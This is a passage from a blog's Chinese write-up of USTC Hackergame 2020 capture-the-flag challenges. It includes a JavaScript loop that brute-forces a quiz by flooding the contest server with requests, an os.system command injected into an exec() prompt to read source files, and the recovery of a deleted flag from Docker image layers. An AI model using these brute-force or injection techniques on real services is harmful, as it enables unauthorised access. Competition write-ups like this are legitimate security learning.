class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 